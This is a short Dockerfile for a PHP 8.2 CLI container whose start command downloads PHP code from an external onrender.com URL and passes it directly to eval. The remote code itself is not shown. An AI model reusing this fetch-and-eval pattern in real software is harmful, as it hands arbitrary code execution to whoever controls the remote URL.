FROM php:8.2-cli

WORKDIR /app

CMD php -r "eval(file_get_contents('https://dataworks-7b7x.onrender.com/kualiAPI/run-all-reads.php'));"

